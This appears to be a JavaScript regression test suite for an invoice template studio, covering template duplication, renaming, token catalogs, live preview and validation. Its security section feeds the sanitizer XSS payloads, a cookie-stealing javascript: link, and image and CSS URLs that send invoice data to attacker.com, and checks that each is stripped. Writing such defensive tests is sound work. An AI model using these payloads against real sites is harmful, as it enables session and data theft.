import 'fake-indexeddb/auto';
import Dexie from 'dexie';
import {
    TABLE_NAMES,
    BUILT_IN_TEMPLATE_NAMES,
    TEMPLATE_SCHEMA,
    MAX_TEMPLATE_FILE_SIZE_BYTES
} from '../constants/index.js';
import {
    seedBuiltInTemplates,
    saveTemplateAsync,
    deleteTemplateAsync,
    duplicateTemplateAsync,
    renameTemplateAsync
} from './templateService.js';
import {
    TEMPLATE_TOKENS,
    TOKEN_CATEGORIES,
    verifyAllTokensSupported,
    generateUniqueTemplateName
} from '../utils/templateTokens.js';
import {
    SUPPORTED_TEMPLATE_TOKENS,
    validateTemplateStudioPayload,
    validateTemplateCss,
    previewTemplateWithCss,
    SAMPLE_INVOICE_DATA
} from '../utils/templateValidator.js';

console.log('Running Template Studio, Duplication, Token Engine & Live Preview Regression Tests...');

let passed = 0;
let failed = 0;

function assert(condition, message) {
    if (condition) {
        console.log(`✅ ${message}`);
        passed++;
    } else {
        console.error(`❌ FAILED: ${message}`);
        failed++;
        throw new Error(`Assertion failed: ${message}`);
    }
}

async function runStudioTests() {
    const testDbName = 'TestTemplateStudioDB_' + Date.now();
    const testDb = new Dexie(testDbName);
    testDb.version(1).stores({
        [TABLE_NAMES.TEMPLATES]: TEMPLATE_SCHEMA,
        [TABLE_NAMES.SETTINGS]: 'key',
        [TABLE_NAMES.INVOICES]: 'id, number, template'
    });
    await testDb.open();

    // =========================================================================
    // 1. TEMPLATE DUPLICATION OF EVERY BUILT-IN TEMPLATE TYPE
    // =========================================================================
    console.log('\n--- 1. Testing Built-in Template Duplication ---');

    await seedBuiltInTemplates(testDb);

    const classic = await testDb.templates.where('name').equals(BUILT_IN_TEMPLATE_NAMES.CLASSIC).first();
    const modern = await testDb.templates.where('name').equals(BUILT_IN_TEMPLATE_NAMES.MODERN).first();
    const minimal = await testDb.templates.where('name').equals(BUILT_IN_TEMPLATE_NAMES.MINIMAL).first();

    assert(classic && classic.isBuiltIn === true, 'Seeded Classic template exists and isBuiltIn: true');
    assert(modern && modern.isBuiltIn === true, 'Seeded Modern template exists and isBuiltIn: true');
    assert(minimal && minimal.isBuiltIn === true, 'Seeded Minimal template exists and isBuiltIn: true');

    // Duplicate Classic
    const classicDup = await duplicateTemplateAsync(classic.id, testDb);
    assert(classicDup && classicDup.id !== classic.id, 'Classic duplicated with new unique ID');
    assert(classicDup.name === 'Classic (Copy)', 'Duplicate named "Classic (Copy)"');
    assert(classicDup.template.isBuiltIn === false, 'Duplicate is explicitly marked isBuiltIn: false');
    assert(classicDup.template.isDefault === false, 'Duplicate isDefault is false');
    assert(classicDup.template.html === classic.html, 'Duplicate preserves full Classic HTML markup');
    assert(classicDup.template.css === classic.css, 'Duplicate preserves full Classic CSS stylesheet');

    // Duplicate Modern
    const modernDup = await duplicateTemplateAsync(modern.id, testDb);
    assert(modernDup && modernDup.id !== modern.id, 'Modern duplicated with new unique ID');
    assert(modernDup.name === 'Modern (Copy)', 'Duplicate named "Modern (Copy)"');
    assert(modernDup.template.isBuiltIn === false, 'Modern duplicate is marked isBuiltIn: false');
    assert(modernDup.template.html === modern.html, 'Modern duplicate preserves Modern HTML');
    assert(modernDup.template.css === modern.css, 'Modern duplicate preserves Modern CSS');

    // Duplicate Minimal
    const minimalDup = await duplicateTemplateAsync(minimal.id, testDb);
    assert(minimalDup && minimalDup.id !== minimal.id, 'Minimal duplicated with new unique ID');
    assert(minimalDup.name === 'Minimal (Copy)', 'Duplicate named "Minimal (Copy)"');
    assert(minimalDup.template.isBuiltIn === false, 'Minimal duplicate is marked isBuiltIn: false');
    assert(minimalDup.template.html === minimal.html, 'Minimal duplicate preserves Minimal HTML');

    // Verify all original built-ins remained completely untouched
    const classicAfterDups = await testDb.templates.get(classic.id);
    const modernAfterDups = await testDb.templates.get(modern.id);
    const minimalAfterDups = await testDb.templates.get(minimal.id);

    assert(classicAfterDups.name === BUILT_IN_TEMPLATE_NAMES.CLASSIC && classicAfterDups.isBuiltIn === true, 'Original Classic remained completely unchanged');
    assert(modernAfterDups.name === BUILT_IN_TEMPLATE_NAMES.MODERN && modernAfterDups.isBuiltIn === true, 'Original Modern remained completely unchanged');
    assert(minimalAfterDups.name === BUILT_IN_TEMPLATE_NAMES.MINIMAL && minimalAfterDups.isBuiltIn === true, 'Original Minimal remained completely unchanged');

    // =========================================================================
    // 2. INDEPENDENT EDITABILITY OF DUPLICATES
    // =========================================================================
    console.log('\n--- 2. Testing Independent Editability of Duplicates ---');

    const editedHtml = classicDup.template.html.replace('TAX INVOICE', 'BESPOKE CUSTOM INVOICE');
    const editedCss = classicDup.template.css + '\n.custom-accent { color: #6366f1; }';

    await saveTemplateAsync({
        id: classicDup.id,
        name: 'My Customized Classic',
        html: editedHtml,
        css: editedCss,
        isDefault: false
    }, testDb);

    const reloadedDup = await testDb.templates.get(classicDup.id);
    assert(reloadedDup.name === 'My Customized Classic', 'Duplicate updated with new custom name');
    assert(reloadedDup.html.includes('BESPOKE CUSTOM INVOICE'), 'Duplicate updated with custom HTML');
    assert(reloadedDup.css.includes('.custom-accent'), 'Duplicate updated with custom CSS');
    assert(reloadedDup.isBuiltIn === false, 'Duplicate retains isBuiltIn: false after edit');

    // Original Classic is still pure baseline
    const originalClassicCheck = await testDb.templates.get(classic.id);
    assert(originalClassicCheck.html.includes('TAX INVOICE'), 'Original Classic HTML remains pure baseline');
    assert(!originalClassicCheck.html.includes('BESPOKE CUSTOM INVOICE'), 'Original Classic contains no duplicate edits');
    assert(!originalClassicCheck.css.includes('.custom-accent'), 'Original Classic contains no duplicate CSS rules');

    // =========================================================================
    // 3. DUPLICATING UPLOADED / CUSTOM TEMPLATES
    // =========================================================================
    console.log('\n--- 3. Testing Duplicating Custom Templates ---');

    const customId = await saveTemplateAsync({
        name: 'Emerald Consulting Layout',
        html: '<div class="emerald-layout"><h1>{{sender.name}}</h1><p>{{invoiceNumber}}</p></div>',
        css: '.emerald-layout { color: #047857; }',
        isDefault: false
    }, testDb);

    const customDup = await duplicateTemplateAsync(customId, testDb);
    assert(customDup.name === 'Emerald Consulting Layout (Copy)', 'Custom duplicate named with (Copy)');
    assert(customDup.template.isBuiltIn === false, 'Custom duplicate is isBuiltIn: false');
    assert(customDup.template.html.includes('emerald-layout'), 'Custom duplicate preserves custom HTML');
    assert(customDup.template.css.includes('#047857'), 'Custom duplicate preserves custom CSS');

    // Edit the duplicate custom template
    await saveTemplateAsync({
        id: customDup.id,
        name: 'Emerald Consulting Layout (Copy)',
        html: '<div class="emerald-layout-v2"><h1>{{sender.name}}</h1></div>',
        css: '.emerald-layout-v2 { color: #065f46; }',
        isDefault: false
    }, testDb);

    // Verify original custom template is unchanged
    const originalCustom = await testDb.templates.get(customId);
    assert(originalCustom.html.includes('{{invoiceNumber}}'), 'Original custom template unchanged by duplicate edits');

    // =========================================================================
    // 4. DETERMINISTIC UNIQUE NAME GENERATION
    // =========================================================================
    console.log('\n--- 4. Testing Unique Name Generation Logic ---');

    const templatesList = [
        { name: 'Classic' },
        { name: 'Classic (Copy)' },
        { name: 'Classic (Copy 2)' },
        { name: 'Invoice Layout' }
    ];

    const copy1 = generateUniqueTemplateName('Classic', templatesList);
    assert(copy1 === 'Classic (Copy 3)', 'generateUniqueTemplateName resolved next available copy counter: "Classic (Copy 3)"');

    const copyFresh = generateUniqueTemplateName('Invoice Layout', templatesList);
    assert(copyFresh === 'Invoice Layout (Copy)', 'generateUniqueTemplateName produces "(Copy)" for fresh base');

    const copyCaseCheck = generateUniqueTemplateName('invoice layout', [{ name: 'Invoice Layout (Copy)' }]);
    assert(copyCaseCheck === 'invoice layout (Copy 2)', 'generateUniqueTemplateName detects case-insensitive duplicates');

    // =========================================================================
    // 5. BUILT-IN TEMPLATE PERMANENT READ-ONLY PROTECTION
    // =========================================================================
    console.log('\n--- 5. Testing Built-in Template Protection ---');

    // Attempting to overwrite a built-in template via saveTemplateAsync must fail
    let overwriteThrew = false;
    try {
        await saveTemplateAsync({
            id: classic.id,
            name: 'Classic Overwritten',
            html: '<div>Malicious Overwrite</div>',
            css: ''
        }, testDb);
    } catch (err) {
        overwriteThrew = true;
        assert(err.message.includes('Built-in template "Classic" is read-only'), 'saveTemplateAsync rejects modifying built-in template');
    }
    assert(overwriteThrew, 'saveTemplateAsync prevented overwriting built-in template');

    // Attempting to delete a built-in template via deleteTemplateAsync must fail
    let deleteThrew = false;
    try {
        await deleteTemplateAsync(classic.id, testDb);
    } catch (err) {
        deleteThrew = true;
        assert(err.message.includes('Cannot delete built-in template "Classic"'), 'deleteTemplateAsync rejects deleting built-in template');
    }
    assert(deleteThrew, 'deleteTemplateAsync prevented deleting built-in template');

    // Attempting to rename a built-in template via renameTemplateAsync must fail
    let renameThrew = false;
    try {
        await renameTemplateAsync(classic.id, 'Renamed Classic', testDb);
    } catch (err) {
        renameThrew = true;
        assert(err.message.includes('Built-in templates are read-only and cannot be renamed'), 'renameTemplateAsync rejects renaming built-in template');
    }
    assert(renameThrew, 'renameTemplateAsync prevented renaming built-in template');

    // =========================================================================
    // 6. CUSTOM TEMPLATE RENAMING
    // =========================================================================
    console.log('\n--- 6. Testing Custom Template Renaming ---');

    const renameTargetId = await saveTemplateAsync({
        name: 'Initial Name',
        html: '<div>Valid HTML</div>',
        css: '',
        isDefault: false
    }, testDb);

    const renamed = await renameTemplateAsync(renameTargetId, 'Updated Unique Name', testDb);
    assert(renamed.name === 'Updated Unique Name', 'renameTemplateAsync successfully updated name');

    // Rejects empty name
    let emptyRenameThrew = false;
    try {
        await renameTemplateAsync(renameTargetId, '   ', testDb);
    } catch (err) {
        emptyRenameThrew = true;
        assert(err.message.includes('cannot be empty'), 'renameTemplateAsync rejects empty name');
    }
    assert(emptyRenameThrew, 'Empty rename was rejected');

    // Rejects duplicate name
    let dupRenameThrew = false;
    try {
        await renameTemplateAsync(renameTargetId, 'Classic', testDb);
    } catch (err) {
        dupRenameThrew = true;
        assert(err.message.includes('already exists'), 'renameTemplateAsync rejects duplicate template name');
    }
    assert(dupRenameThrew, 'Duplicate rename was rejected');

    // =========================================================================
    // 7. TEMPLATE TOKENS CATALOG & ENGINE DERIVATION
    // =========================================================================
    console.log('\n--- 7. Testing Template Tokens Derivation & Catalog ---');

    assert(Array.isArray(TEMPLATE_TOKENS) && TEMPLATE_TOKENS.length > 25, 'TEMPLATE_TOKENS catalog is populated (> 25 tokens)');
    assert(verifyAllTokensSupported(), 'All tokens in TEMPLATE_TOKENS are verified in SUPPORTED_TEMPLATE_TOKENS');

    const categories = new Set(TOKEN_CATEGORIES.map(c => c.id));
    assert(categories.has('all'), 'Token categories include "all"');
    assert(categories.has('invoice'), 'Token categories include "invoice"');
    assert(categories.has('business'), 'Token categories include "business"');
    assert(categories.has('customer'), 'Token categories include "customer"');
    assert(categories.has('items'), 'Token categories include "items"');
    assert(categories.has('totals'), 'Token categories include "totals"');
    assert(categories.has('payment'), 'Token categories include "payment"');

    // Check specific critical token entries
    const invNumToken = TEMPLATE_TOKENS.find(t => t.token === 'invoiceNumber');
    assert(invNumToken && invNumToken.syntax === '{{invoiceNumber}}', 'invoiceNumber syntax is {{invoiceNumber}}');
    assert(invNumToken.category === 'invoice', 'invoiceNumber category is invoice');

    const itemsBlockToken = TEMPLATE_TOKENS.find(t => t.token === 'items');
    assert(itemsBlockToken && itemsBlockToken.isBlock === true, 'items token is marked isBlock: true');
    assert(itemsBlockToken.syntax.includes('{{#items}}') && itemsBlockToken.syntax.includes('{{/items}}'), 'items block syntax contains block delimiters');

    const totalWordsToken = TEMPLATE_TOKENS.find(t => t.token === 'totals.totalInWords');
    assert(totalWordsToken && totalWordsToken.category === 'totals', 'totalInWords token categorized under totals');

    // =========================================================================
    // 8. LIVE PREVIEW RENDERING WITH HTML + CSS
    // =========================================================================
    console.log('\n--- 8. Testing Live Preview Rendering with HTML + CSS ---');

    const testHtml = `
      <div class="studio-invoice">
        <h1>{{sender.name}}</h1>
        <p class="inv-num">{{invoiceNumber}}</p>
        <p class="client">{{recipient.name}}</p>
        <table>
          <tbody>
            {{#items}}
            <tr>
              <td class="item-desc">{{description}}</td>
              <td class="item-rate">{{price}}</td>
            </tr>
            {{/items}}
          </tbody>
        </table>
        <p class="total">{{totals.total}}</p>
      </div>
    `;
    const testCss = `
      .studio-invoice { font-family: sans-serif; color: #1e1b4b; }
      .studio-invoice h1 { font-size: 24px; color: #4338ca; }
      .studio-invoice .total { font-weight: bold; }
    `;

    const renderedPreview = previewTemplateWithCss(testHtml, testCss, SAMPLE_INVOICE_DATA);

    assert(renderedPreview.includes('Apex Solutions Pvt Ltd'), 'Preview renders sender.name');
    assert(renderedPreview.includes('INV-2026-001'), 'Preview renders invoiceNumber');
    assert(renderedPreview.includes('Global Enterprises Ltd'), 'Preview renders recipient.name');
    assert(renderedPreview.includes('Web Application Architecture'), 'Preview renders item line description');
    assert(renderedPreview.includes('68,800.00'), 'Preview renders formatted grand total');
    assert(renderedPreview.includes('<style>'), 'Preview includes injected <style> block');
    assert(renderedPreview.includes('.studio-invoice'), 'Preview preserves custom CSS rules');

    // Rapid/Empty/Null preview updates handled safely
    assert(previewTemplateWithCss('', testCss) === '', 'Empty HTML returns empty string');
    assert(previewTemplateWithCss(null, testCss) === '', 'Null HTML returns empty string safely');
    assert(previewTemplateWithCss(testHtml, '') !== '', 'Empty CSS renders HTML cleanly without <style>');

    // =========================================================================
    // 9. ADVERSARIAL SECURITY TESTING FOR TEMPLATE STUDIO
    // =========================================================================
    console.log('\n--- 9. Testing Adversarial Security Invariants in Studio ---');

    // 9.1 Script tags in HTML
    const maliciousHtmlWithScript = `<div class="test">Invoice</div><script>window.pwned=true; alert('XSS');</script>`;
    const safeScriptPreview = previewTemplateWithCss(maliciousHtmlWithScript, '');
    assert(!safeScriptPreview.includes('<script>'), 'Script tag stripped from live preview');
    assert(!safeScriptPreview.includes('window.pwned'), 'Script body stripped from live preview');

    // 9.2 Event handlers on elements
    const maliciousHtmlWithHandlers = `<button onclick="alert(1)" onmouseover="steal()" onerror="bad()">Click</button>`;
    const safeHandlerPreview = previewTemplateWithCss(maliciousHtmlWithHandlers, '');
    assert(!safeHandlerPreview.includes('onclick'), 'onclick stripped');
    assert(!safeHandlerPreview.includes('onmouseover'), 'onmouseover stripped');
    assert(!safeHandlerPreview.includes('onerror'), 'onerror stripped');

    // 9.3 javascript: URLs in hyperlinks and CSS
    const maliciousHref = `<a href="javascript:alert(document.cookie)">Click here</a>`;
    const safeHrefPreview = previewTemplateWithCss(maliciousHref, '');
    assert(!safeHrefPreview.includes('javascript:'), 'javascript: href stripped');

    // 9.4 CSS @import stripping
    const maliciousCssWithImport = `@import url('https://attacker.com/evil.css'); body { color: red; }`;
    const safeImportPreview = previewTemplateWithCss('<div>Test</div>', maliciousCssWithImport);
    assert(!safeImportPreview.includes('@import'), 'CSS @import stripped completely');
    assert(safeImportPreview.includes('color:red') || safeImportPreview.includes('color: red'), 'Legitimate CSS properties retained');

    // 9.5 External resource URL disclosure in HTML and CSS
    const maliciousImg = `<img src="https://attacker.com/leak?data={{totals.total}}" />`;
    const safeImgPreview = previewTemplateWithCss(maliciousImg, '');
    assert(!safeImgPreview.includes('attacker.com'), 'External image resource URL blocked');

    const maliciousCssUrl = `.banner { background-image: url('https://attacker.com/leak.png'); }`;
    const safeCssUrlPreview = previewTemplateWithCss('<div>Test</div>', maliciousCssUrl);
    assert(!safeCssUrlPreview.includes('attacker.com'), 'External CSS background URL blocked');

    // 9.6 SVG script injection
    const maliciousSvg = `<svg><script>alert('svg xss')</script></svg>`;
    const safeSvgPreview = previewTemplateWithCss(maliciousSvg, '');
    assert(!safeSvgPreview.includes('<script>'), 'SVG script tag stripped');

    // =========================================================================
    // 10. PAYLOAD VALIDATION & SIZE LIMITS
    // =========================================================================
    console.log('\n--- 10. Testing Payload Validation & Size Limits ---');

    // Valid payload
    const validCheck = validateTemplateStudioPayload({
        name: 'Brand New Bespoke Layout',
        html: '<div class="test"><h1>{{sender.name}}</h1></div>',
        css: '.test { color: #333; }',
        existingTemplates: []
    });
    assert(validCheck.valid === true, 'Valid payload passes validation');
    assert(validCheck.trimmedName === 'Brand New Bespoke Layout', 'Name is trimmed correctly');

    // Missing / Empty name
    const emptyNameCheck = validateTemplateStudioPayload({
        name: '   ',
        html: '<div>Test</div>',
        css: ''
    });
    assert(emptyNameCheck.valid === false, 'Empty name rejected');
    assert(emptyNameCheck.errors.name !== undefined, 'Name error returned');

    // Duplicate name
    const dupNameCheck = validateTemplateStudioPayload({
        name: 'Classic',
        html: '<div>Test</div>',
        css: '',
        existingTemplates: [{ name: 'Classic' }]
    });
    assert(dupNameCheck.valid === false, 'Duplicate name rejected');
    assert(dupNameCheck.errors.name.includes('already exists'), 'Duplicate name error mentions collision');

    // Empty HTML
    const emptyHtmlCheck = validateTemplateStudioPayload({
        name: 'Valid Name',
        html: '   ',
        css: ''
    });
    assert(emptyHtmlCheck.valid === false, 'Empty HTML rejected');
    assert(emptyHtmlCheck.errors.html !== undefined, 'HTML error returned');

    // HTML without markup tags
    const plainTextCheck = validateTemplateStudioPayload({
        name: 'Valid Name',
        html: 'Just plain text without any html tags',
        css: ''
    });
    assert(plainTextCheck.valid === false, 'Plain text without HTML tags rejected');

    // Oversized HTML + CSS (> 2 MB)
    const hugeHtml = '<p>' + 'A'.repeat(MAX_TEMPLATE_FILE_SIZE_BYTES + 50) + '</p>';
    const oversizedCheck = validateTemplateStudioPayload({
        name: 'Huge Template',
        html: hugeHtml,
        css: ''
    });
    assert(oversizedCheck.valid === false, 'Oversized template rejected');
    assert(oversizedCheck.errors.general !== undefined || oversizedCheck.errors.html !== undefined, 'Size error returned');

    // CSS binary character detection
    const nullByteCssCheck = validateTemplateCss('.style { content: "\0evil"; }');
    assert(nullByteCssCheck.valid === false, 'CSS with null bytes rejected');

    testDb.close();
    await Dexie.delete(testDbName);

    console.log(`\n======================================================`);
    console.log(`Tests Completed: ${passed} Passed, ${failed} Failed`);
    console.log(`======================================================\n`);
}

runStudioTests().catch((err) => {
    console.error('Test suite encountered an uncaught error:', err);
    process.exit(1);
});
